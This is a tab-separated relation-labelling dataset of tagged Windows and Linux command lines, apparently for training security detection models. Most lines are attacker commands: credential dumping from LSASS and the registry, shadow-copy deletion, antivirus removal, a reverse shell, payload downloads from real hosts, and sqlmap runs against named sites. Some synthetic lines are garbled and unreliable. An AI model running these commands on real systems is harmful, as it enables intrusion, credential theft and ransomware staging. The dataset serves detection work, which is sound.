process-file-write(e1,e2)	"C:\Windows\System32\cmd.exe /c echo <e1>curl</e1> https://moashraya[.]com/out/t.php --output <e2>""%temp%\magni.waut.a""</e2> --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>reg.exe</e1> save hklm\security <e2>c:\ProgramData\security.save</e2>
Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && python.exe <e2>Packages.txt</e2>
process-socket-send(e1,e2)	torify <e1>sqlmap</e1> -u <e2>https://<domain>.gov.bd/admin/manage_user.php?id=1</e2> -v 2 --delay 1.7 --time-sec 13 --tamper space2comment --risk 3 --level 5 --random-agent --no-cast --parse-errors --dbs
process-process-inject(e1,e2)	<e1>c:\windows\system\dumpert.exe</e1> <e2>lsass.exe</e2>
process-process-unlink(e1,e2)	"<e1>C:\Windows\system32\net1</e1> stop <e2>""veeamdeploysvc""</e2> /y"
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Set-ProcessInjection -Target <e2>winlogon.exe</e2>
process-file-write(e1,e2)	<e1>net</e1> localgroup <e2>Administrators</e2> /add DefaultAccount;
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Set-ProcessInjection -Target <e2>svchost.exe</e2>
process-file-read(e1,e2)	"<e1>makecab</e1> <e2>""C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.bin""</e2> C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.cab"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.wmiserver.exe</e2> /F
process-file-unlink(e1,e2)	<e1>powershell.exe</e1> -Command PowerShell -Command Get-CimInstance <e2>Win32_ShadowCopy</e2> | Remove-CimInstance
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=out name =""WMI_OUT"" program=C:\Windows\system32\svchost.exe service=winmgmt action=allow protocol=TCP localport=any > C:\Windows\Temp\WkiMfXXo.tmp 2>&1"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>taskkill</e2> /IM winlogon.exe /F
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -sc trustdmp > trustdmp.txt
process-file-write(e1,e2)	cmd_7.exe /c <e1>echo</e1> malicious > <e2>C:\Temp\evil_7.bat</e2>
process-file-read(e1,e2)	"start <e1>PsExec.exe</e1> -accepteula <e2>@C:\share$\comps1.txt</e2> -u ""domain\User"" -p ""$PASSWORD"" cmd /c COPY ""\\DOMAINCONTROLLER\share$\fQumH.exe"" ""C:\windows\temp"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
process-file-read(e1,e2)	<e1>reg_40.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-write(e1,e2)	<e1>cmd.exe</e1> /Q /c dir 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-process-fork(e1,e2)	wmic.exe <e1>powershell</e1> Start-Process <e2>python.exe</e2>
process-process-fork(e1,e2)	"<e1>wmic</e1> /node:IP_Address process call create <e2>""cmd.exe</e2> /c start C:\Progradata\sc_https_x64.exe"""
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\hosts.txt)</e1> do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\hosts_live.txt
process-socket-send(e1,e2)	svchost.exe <e1>curl</e1> -X POST --data 'ping' <e2>https://evil.server/payload</e2>
process-file-unlink(e1,e2)	cmd.exe /c <e1>DEL</e1> <e2>%USERPROFILE%\AppData\bigfile.txt</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp""</e2> /t REG_DWORD /v ""fEnableWinStation"" /d 1 /f"
process-file-read(e1,e2)	<e1>ftp_90.exe</e1> <e2>-s:script_90.txt</e2> C:\inetpub\wwwroot\ftp_90.log
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Malwarebytes' Managed Client""</e2> call uninstall /nointeractive"
process-process-fork(e1,e2)	"<e1>torify</e1> <e2>ghauri</e2> -u ""https://<domain>.<domain>.in/products/all-products?category=CATMAPF0CE"" --dbs"
process-socket-send(e1,e2)	rundll32.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	"cmd.exe /C <e1>wmic</e1> /node:""servername.domainname"" process call create <e2>""C:\PerfLogs\procdump.exe</e2> -accepteula -ma lsass C:\PerfLogs\lsass.dmp"""
process-socket-send(e1,e2)	"<e1>wmic</e1> <e2>/node:""[TARGET IP]""</e2> /user:""[DOMAIN]\[USER]"" /password:""[PASSWORD]"" process call create ""cmd.exe /c c:\windows\temp\p.bat"""
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd <e2>%appdata%\Microsoft\Network</e2> && python.exe Packages.txt
process-file-exec(e1,e2)	"wmic /node:""<IP ADDRESS>"" /user:""<DOMAIN>\Administrator"" /password:""<PASSWORD>"" process call create <e1>""cmd.exe</e1> /c <e2>c:\windows\temp\ttsel.exe""</e2>"
process-file-exec(e1,e2)	<e1>wmic.exe</e1> -exec <e2>C:\Windows\Temp\evil.dll</e2>
process-file-write(e1,e2)	<e1>ftp_67.exe</e1> -s:script_67.txt <e2>C:\inetpub\wwwroot\ftp_67.log</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM taskmgr.exe /F
process-file-chmod(e1,e2)	"<e1>icacls</e1> <e2>""D:\*""</e2> /grant Everyone\:F /T /C /Q"
process-file-write(e1,e2)	"psexec \\<redacted> -u <redacted>\<redacted> -p <redacted> <e1>reg</e1> add <e2>""hklm\system\currentcontrolset\control\lsa""</e2> /f /v DisableRestrictedAdmin /t REG_DWORD /d 0"
Other	"start PsExec.exe -accepteula -d <e1>@C:\share$\comps5.txt</e1> -u ""domain\User"" -p ""$PASSWORD"" cmd /c <e2>""C:\windows\temp\fQumH.exe""</e2>"
process-file-write(e1,e2)	<e1>adfind.exe</e1> -sc trustdmp > <e2>trustdmp.txt</e2>
process-file-read(e1,e2)	"<e1>powershell_52.exe</e1> -Command ""gc <e2>C:\ProgramData\conf_52.yaml""</e2>"
process-process-fork(e1,e2)	"<e1>schtasks</e1> /Create /TN ""8766714F94DD"" /XML <e2>""C:\ProgramData\Microsoft\51D7701F6EB775C7.txt""</e2>"
process-process-fork(e1,e2)	<e1>nc</e1> -e <e2>/bin/bash</e2> 104.200.67.3 1608 2> /dev/null
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>10.10.10.10:4444</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Webroot SecureAnywhere"" call uninstall /nointeractive"
Other	"<e1>C:\Windows\system32\cmd.exe</e1> /C AdFind.exe -f ""&(objectcategory=computer)"" operatingSystem -csv > <e2>1.csv</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>getsystem</e2>
process-socket-send(e1,e2)	<e1>rundll32.exe</e1> locker.dll,run <e2>/TARGET=\\HOST1.DOMAIN.NAME\C$</e2> /TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>powershell.exe</e2>
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
process-socket-receive(e1,e2)	cmd.exe <e1>python3</e1> -m http.server 8080 --bind <e2>http://attacker.com/c2</e2>
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /c <e1>echo</e1> 00e4f7418cd > <e2>\\.\pipe\9090e9</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -f ""(objectcategory=person)"" > <e2>ad_users.txt</e2>"
process-file-write(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd > C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp 2> <e2>C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp</e2>
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | <e1>find</e1> /I TTL >> <e2>C:\ProgramData\servers_live.txt</e2>
process-file-write(e1,e2)	"<e1>python_42.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_42.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-process-fork(e1,e2)	<e1>cmd_5.exe</e1> /c <e2>echo</e2> malicious > C:\Temp\evil_5.bat
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && <e2>python.exe</e2> Packages.txt
process-file-unlink(e1,e2)	rundll32.exe <e1>rm</e1> <e2>C:\Users\Public\runme.bat</e2>
process-file-exec(e1,e2)	"<e1>wmic</e1> /node:""192.168.1.2"" process call create <e2>""C:\Perflogs\434.bat""</e2>"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>wevtutil</e2> cl application4
process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/var/tmp/hide.so</e2>
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netstat</e2> -a -n -p tcp | find ""ESTAB"""
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
process-file-write(e1,e2)	"cmd /v /c <e1>nltest</e1> /trusted\_domains > <e2>""%TEMP%\22041.txt""</e2> 2>&1"
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>icacls</e2> C:\Windows\Temp\evil.dll /grant Everyone:F
process-file-unlink(e1,e2)	cmd.exe /c <e1>DEL</e1> <e2>%USERPROFILE%\AppData\1.bat</e2>
process-process-unlink(e1,e2)	<e1>svchost.exe</e1> Stop-Process -Name <e2>winlogon.exe</e2> -Force
process-socket-send(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""ENDPOINT""</e2> process call create C:\test.exe"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>del</e2> /tmp/malware.sh
process-file-exec(e1,e2)	"<e1>schtasks</e1> /create /ru SYSTEM /tn ""OneDrive Security Task-S-1-5-21-REDACTED"" /tr <e2>c:\windows\adfs\py\UpdateEdge.bat</e2> /sc MINUTE /mo 720 /F"
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> HOSTX
Other	C:\Windows\system32\cmd.exe /c cd <e1>%appdata%\Microsoft\Network</e1> && powershell -Command start <e2>script.bat</e2> -Verb RunAs
process-process-fork(e1,e2)	<e1>wmic.exe</e1> /c start <e2>wmic.exe</e2>
process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> J9kzQ2Y0qO | <e2>C:\ProgramData\anydesk.exe</e2> --set-password
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill $(Get-Process <e2>winlogon.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
process-socket-send(e1,e2)	cmd.exe /c <e1>echo</e1> a3fed5b3a32 > <e2>\\.\pipe\3406c2</e2>
process-file-exec(e1,e2)	powershell <e1>rundll32.exe</e1> <e2>c:\windows\system32\comsvcs.dll</e2>, minidump (get-process lsass).id c:\temp\lsass.dmp full
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' 192.168.1.100:8080
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>netsh</e2> advfirewall firewall add rule dir=in name=""DCOM"" program=C:\Windows\system32\svchost.exe service=rpcss action=allow protocol=TCP localport=135 > C:\Windows\Temp\pOrnerOW.tmp 2>&1"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>echo</e2> 31b925aa0f7 > \\.\pipe\8945a5
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>icacls</e2> /usr/local/bin/backdoor /grant Everyone:F
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecManagementService</e2> /y
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>nc</e2> -lvp 4444 -s 10.10.10.10:4444
process-process-unlink(e1,e2)	python.exe <e1>taskkill</e1> /IM <e2>explorer.exe</e2> /F
process-process-fork(e1,e2)	"<e1>schtasks</e1> /create /RL HIGHEST /RU ""NT AUTHORITY\SYSTEM"" /sc minute /mo 30 /tn ""schdsWin"" /tr <e2>""cmd.exe</e2> /C certutil.exe -urlcache -f http://192.169.6.122:6770/svchost.exe %systemdrive%\\Windows\\Temp\\svchost.exe & %systemdrive%\\Windows\\Temp\\svchost.exe"""
process-process-inject(e1,e2)	<e1>wmic.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>lsass.exe</e2>
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Set-MpPreference</e2> -DisableRealtimeMonitoring \$true
process-socket-receive(e1,e2)	python.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
process-file-write(e1,e2)	"<e1>powershell_20.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_20.txt</e2> -Value 'infected'"""
process-file-read(e1,e2)	<e1>powershell_70.exe</e1> Get-Content <e2>C:\Users\Public\secrets_70.txt</e2>
process-file-chmod(e1,e2)	wmic.exe <e1>attrib</e1> +s +h <e2>C:\Users\Public\runme.bat</e2>
process-file-unlink(e1,e2)	powershell.exe <e1>rm</e1> <e2>C:\Windows\Temp\evil.dll</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 10.10.10.10:4444
process-file-exec(e1,e2)	<e1>rundll32_83.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-process-inject(e1,e2)	<e1>cmd.exe</e1> dllinjector.exe -p <e2>explorer.exe</e2> -d payload.dll
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C <e2>reg</e2> add ""HKLM\software\microsoft\windows nt\currentversion\winlogon"" /v UserInit /t reg_sz /d ""c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat"
process-file-unlink(e1,e2)	svchost.exe <e1>Remove-Item</e1> <e2>C:\Windows\Temp\evil.dll</e2> -Force
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\servers.txt)</e1> do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\servers_live.txt
process-socket-send(e1,e2)	<e1>cmd.exe</e1> Invoke-WebRequest -Uri <e2>10.10.10.10:4444</e2> -Method POST
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKEY\_LOCAL\_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System""</e2> /v LocalAccountTokenFilterPolicy /t REG\_DWORD /d 1 /f"
process-socket-receive(e1,e2)	powershell.exe <e1>nc</e1> -lvp <e2>4444</e2> -s 10.10.10.10:4444
process-file-read(e1,e2)	<e1>wmic_97.exe</e1> process get commandline < <e2>C:\cmd\proc_97.txt</e2>
process-file-write(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML C:\windows\temp\Wininet.xml /tn <e2>'\Microsoft\Windows\Maintenance\Wininet'</e2>
process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>python3</e1> -m http.server 8080 --bind <e2>https://evil.server/payload</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run""</e2> /V ""microsoft update"" /t REG_SZ /F /D ""SCHTASKS /run /tn 9T6ukfi6"""
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeam.backup.catalogdataservice.exe</e2> /F
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\hosts.txt)</e1> do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\hosts_live.txt
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>svchost.exe</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> runas /user:admin <e2>cmd.exe</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\System32\cmd.exe</e1> /c echo <e2>curl</e2> https://moashraya[.]com/out/t.php --output ""%temp%\magni.waut.a"" --ssl no-revoke --insecure --location > %temp%\magni.w.bat"
process-file-read(e1,e2)	<e1>wmic_48.exe</e1> process get commandline < <e2>C:\cmd\proc_48.txt</e2>
process-file-write(e1,e2)	<e1>rundll32_46.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Set-ProcessInjection -Target <e2>taskmgr.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c <e2>rundll32.exe</e2> C:\ProgramData\x86.dll, StartA
process-file-chmod(e1,e2)	rundll32.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
process-file-chmod(e1,e2)	wmic.exe <e1>icacl</e1>s <e2>/var/tmp/hide.so</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>powershell.exe</e1> /c start <e2>python.exe</e2>
process-socket-receive(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> <e2>/node:""REDACTED""</e2> process call create ""c:\windows\system32\rundll32.exe c:\windows\temp\1.dll, DllRegisterServer‘"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> /c start <e2>rundll32.exe</e2>
process-socket-send(e1,e2)	"cmd.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
process-file-read(e1,e2)	<e1>notepad_56.exe</e1> <e2>C:\Users\admin\notes_56.txt</e2>
Other	cmd.exe /q /c upload <e1>c:\users\<user>\documents\<doc></e1> <e2>/home/kali/desktop/<doc></e2> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | <e2>find</e2> /I TTL >> C:\ProgramData\hosts_live.txt
process-file-read(e1,e2)	"<e1>cmd.exe</e1> /c ""bitsadmin /transfer ds <e2>""\\REDACTED\share$\ds.exe""</e2> ""%APPDATA%\ds.exe"" && ""%APPDATA%\ds.exe"" -pass REDACTED"""
process-file-read(e1,e2)	<e1>notepad_66.exe</e1> <e2>C:\Users\admin\notes_66.txt</e2>
process-socket-send(e1,e2)	"<e1>netsh</e1> advfirewall firewall set rule <e2>group=""remote desktop""</e2> new enable=yes"
process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>svchost.exe</e2> -Force
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>curl</e2> -X POST --data 'ping' https://evil.server/payload
process-file-read(e1,e2)	<e1>cmd_35.exe</e1> /c type <e2>C:\Windows\System32\drivers\etc\hosts</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>svchost.exe</e2>
Other	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && powershell Expand-Archive <e2>python-3.10.4-embed-amd64.zip</e2> -DestinationPath %appdata%\Microsoft\Network
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>vssadmin</e2> create shadow /for=C: 2>&1
process-process-inject(e1,e2)	<e1>cmd.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>notepad.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>adfind.exe</e2> -subnets -f (objectCategory=subnet)> subnets.txt
process-file-unlink(e1,e2)	<e1>reg.exe</e1> delete <e2>hkcu\software\classes\ms-settings</e2> /f >nul 2>&1
process-socket-send(e1,e2)	"wmic.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>10.10.10.10:4444</e2> -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	<e1>net</e1> user <e2>sqlbackup</e2> qc69t4bz0ke3 /add
process-file-write(e1,e2)	<e1>rundll32_99.exe</e1> shell32.dll,Control_RunDLL <e2>C:\Temp\config.ini</e2>
process-file-exec(e1,e2)	"WMIC /node:""DC.example.domain"" process call create <e1>""rundll32</e1> <e2>C:\PerfLogs\arti64.dll, StartW""</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c start <e2>python.exe</e2>
process-file-exec(e1,e2)	<e1>C:\Windows\System32\rundll32.exe</e1> <e2>dar.dll,DllRegisterServer</e2>
process-file-unlink(e1,e2)	python.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
process-process-unlink(e1,e2)	<e1>powershell.exe</e1> kill $(Get-Process <e2>svchost.exe.Id)</e2>
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Microsoft Security Client""</e2> call uninstall /nointeractive"
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKCU\Software\Policies\Microsoft\Windows\Explorer""</e2> /v ""DisableNotificationCenter"" /t REG_DWORD /d 0x1 /f"
process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>https://evil.server/payload</e2>
process-socket-receive(e1,e2)	svchost.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
Other	ping -n 1 <e1>hostname</e1> >> <e2>C:\programdata\log.txt</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
process-process-fork(e1,e2)	<e1>cmd_95.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_95.txt
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>chmod</e2> 777 /usr/local/bin/backdoor
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C for /f %i in (C:\ProgramData\hosts.txt) do <e2>ping</e2> -n 1 %i -v 4 | find /I TTL >> C:\ProgramData\hosts_live.txt
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\schtasks.exe</e1> /run /tn <e2>""Zvhlxdonjwfvei""</e2>"
process-socket-receive(e1,e2)	powershell.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind http://attacker.com/c2
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>Uninstall-WindowsFeature</e2> -Name Windows-Defender
process-file-write(e1,e2)	"<e1>esentutl.exe</e1> /r V01 /l""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"" <e2>/s""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache""</e2> /d""C:\Users\REDACTED\AppData\Local\Microsoft\Windows\WebCache"""
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>taskkill</e2> /IM explorer.exe /F
process-process-fork(e1,e2)	<e1>rclone</e1> copy <e2>[REDACTED]:/mnt/sdd/REDACTED</e2> --include-from include.txt
process-process-inject(e1,e2)	<e1>python.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-process-unlink(e1,e2)	<e1>taskkill</e1> /f /im <e2>egui.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\System32\cmd.exe</e1> /c <e2>rundll32.exe</e2>
process-socket-receive(e1,e2)	python.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>10.10.10.10:4444</e2>
process-process-unlink(e1,e2)	<e1>svchost.exe</e1> kill $(Get-Process <e2>lsass.exe.Id)</e2>
process-file-read(e1,e2)	<e1>reg_83.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
Other	C:\Windows\system32\cmd.exe /C for /f %%i in <e1>(C:\ProgramData\servers_live.txt)</e1> do dir <e2>\\%%i\C$</e2> >> C:\ProgramData\servers_live_dir.txt
process-socket-receive(e1,e2)	python.exe <e1>nc</e1> -lvp 4444 -s <e2>192.168.1.100:8080</e2>
process-file-exec(e1,e2)	<e1>wmic.exe</e1> /c start <e2>/usr/local/bin/backdoor</e2>
process-file-write(e1,e2)	"<e1>cmd.exe</e1> /c ""bitsadmin /transfer ds ""\\REDACTED\share$\ds.exe"" <e2>""%APPDATA%\ds.exe""</e2> && ""%APPDATA%\ds.exe"" -pass REDACTED"""
process-file-write(e1,e2)	cmd.exe /c <e1>certutil</e1> -decode %USERPROFILE%\AppData\bigfile.txt <e2>%USERPROFILE%\AppData\bigfile.exe</e2>
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> Stop-Process -Name <e2>notepad.exe</e2> -Force
process-process-fork(e1,e2)	"<e1>cmd.exe</e1> /C netstat -a -n -p tcp | <e2>find</e2> ""ESTAB"""
process-socket-receive(e1,e2)	wmic.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-file-exec(e1,e2)	"<e1>cmd.exe</e1> -Command ""Start-Process <e2>C:\Windows\Temp\evil.dll""</e2>"
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""SQLsafe Backup Service""</e2> /y"
process-file-exec(e1,e2)	<e1>powershell.exe</e1> -exec <e2>/tmp/malware.sh</e2>
process-socket-send(e1,e2)	cmd.exe /C <e1>wmic</e1> <e2>/node:<remote host></e2> process get executablepath
process-file-read(e1,e2)	<e1>certutil_59.exe</e1> -urlcache -split -f http://malicious.site/data_59.enc <e2>C:\Temp\temp_59.enc</e2>
process-file-write(e1,e2)	<e1>notepad_26.exe</e1> <e2>C:\Users\test\notes_26.txt</e2>
process-process-fork(e1,e2)	"<e1>start</e1> <e2>wmic</e2> product where name=""Symantec Endpoint Protection"" call uninstall /nointeractive"
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do <e1>dir</e1> \\%%i\C$ >> <e2>C:\ProgramData\servers_live_dir.txt</e2>
process-file-write(e1,e2)	"cmd.exe /C netsh advfirewall firewall add rule dir=in name=""DCOM"" <e1>program=C:\Windows\system32\svchost.exe</e1> service=rpcss action=allow protocol=TCP localport=135 > <e2>C:\Windows\Temp\pOrnerOW.tmp</e2> 2>&1"
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>rm</e2> C:\Users\Public\runme.bat
process-file-write(e1,e2)	<e1>reg</e1> add <e2>HKLM\SYSTEM\CurrrentControlSet\Control\Terminal Server</e2> /f /v fDenyTSConnections /t REG_DWORD /d 0
